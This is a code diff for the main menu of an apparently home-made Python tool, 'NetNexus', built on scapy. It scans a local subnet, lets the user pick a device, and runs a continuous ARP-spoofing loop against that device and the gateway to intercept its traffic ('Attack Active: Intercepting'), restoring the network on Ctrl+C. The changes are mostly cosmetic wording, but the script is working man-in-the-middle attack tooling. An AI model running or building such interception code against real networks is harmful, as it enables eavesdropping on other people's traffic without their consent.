@@ -5,7 +5,7 @@ import sys
 from core import scanner, spoof
 
 def main():
-    # CONFIGURATION: Ensure this matches your 'ip a' output
+    # CONFIGURATION: Set your Arch interface (check 'ip a')
     scapy.conf.iface = "wlan0" 
     
     if os.geteuid() != 0:
@@ -16,33 +16,31 @@ def main():
     ip_range = "192.168.8.1/24"
 
     while True:
-        print("\n" + "="*30)
-        print("   NetNexus Discovery Menu")
-        print("="*30)
+        print("\n" + "="*40)
+        print("      NetNexus: Discovery & Control")
+        print("="*40)
         print(f"[*] Scanning {ip_range}... please wait.")
         
         devices = scanner.scan(ip_range)
         
         print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
-        print("-" * 90)
+        print("-" * 95)
         for index, device in enumerate(devices):
             print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")
         
-        print("-" * 90)
+        print("-" * 95)
         print("[R] Refresh/Rescan Network")
         print("[C] Cancel and Exit")
         
         user_input = input("\nSelect Target ID or Option: ").lower().strip()
 
-        # Handle Menu Options
         if user_input == 'c':
-            print("[*] Exiting NetNexus.")
+            print("[*] Exiting NetNexus. Goodbye.")
             sys.exit()
         elif user_input == 'r':
-            print("[*] Refreshing...")
+            print("[*] Refreshing network map...")
             continue
         
-        # Handle Target Selection
         try:
             choice = int(user_input)
             target = devices[choice]
@@ -53,26 +51,28 @@ def main():
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
 
             if not gateway_mac:
-                print("[-] Error: Could not find Gateway. Try refreshing.")
+                print("[-] Error: Could not find Gateway. Try refreshing [R].")
                 continue
 
-            print(f"[*] Intercepting {target_ip} ({target['name']})...")
+            print(f"[*] Attack Active: Intercepting {target_ip} ({target['name']})")
             packet_count = 0
             while True:
+                # Sends the spoofed packets
                 spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                 packet_count += 2
-                print(f"\r[+] Packets Sent: {packet_count} | Press Ctrl+C to stop", end="") 
+                # Counter proves the script is running and not frozen
+                print(f"\r[+] Intercepting... Packets Sent: {packet_count} | Ctrl+C to Stop", end="") 
                 time.sleep(0.5)
                 
         except (ValueError, IndexError):
-            print("[-] Invalid selection. Please choose a valid ID, 'R', or 'C'.")
+            print("[-] Invalid choice. Use a number from the list, 'R', or 'C'.")
             time.sleep(1)
         except KeyboardInterrupt:
-            print("\n\n[*] Stopping Attack... Restoring network.")
+            print("\n\n[*] Stopping Attack... Restoring network for target.")
             spoof.restore(target_ip, gateway_ip)
             spoof.restore(gateway_ip, target_ip)
-            print("[+] Network Restored. Returning to menu...")
-            time.sleep(2)
+            print("[+] Network Restored. Returning to Menu...")
+            time.sleep(1.5)
 
 if __name__ == "__main__":
     main()
